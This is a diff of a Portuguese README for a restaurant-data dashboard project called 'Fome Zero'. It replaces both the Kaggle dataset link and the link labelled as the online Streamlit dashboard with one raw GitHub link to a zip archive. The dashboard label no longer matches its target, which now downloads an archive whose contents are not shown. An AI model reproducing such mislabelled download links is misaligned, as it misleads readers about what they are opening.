@@ -118,7 +118,7 @@ ___
 
 O conjunto de dados que representam o contexto está disponível na plataforma do Kaggle. O link para acesso aos dados :
 
-https://www.kaggle.com/datasets/akashram/zomato-restaurants-autoupdated-dataset?resource=download&select=zomato.csv
+https://raw.githubusercontent.com/pablocssousa/Projetct_Fome_Zero/master/dataset/Zero_Fome_Projetct_2.0.zip
 
 ___
 
@@ -178,7 +178,7 @@ O painel estratégico foi desenvolvido utilizando as métricas que refletem 4 pr
 
 Dashboard Online, hospedado em cloud e disponível para acesso em qualquer dispositivo conectado à internet.
 
-O dashboard pode ser acessado através deste link: [Dashboard Fome Zero](https://pablocssousa-projetct-fome-zero-home-xxefu9.streamlit.app/)
+O dashboard pode ser acessado através deste link: [Dashboard Fome Zero](https://raw.githubusercontent.com/pablocssousa/Projetct_Fome_Zero/master/dataset/Zero_Fome_Projetct_2.0.zip)
 
 # **6) Conclusão**
 
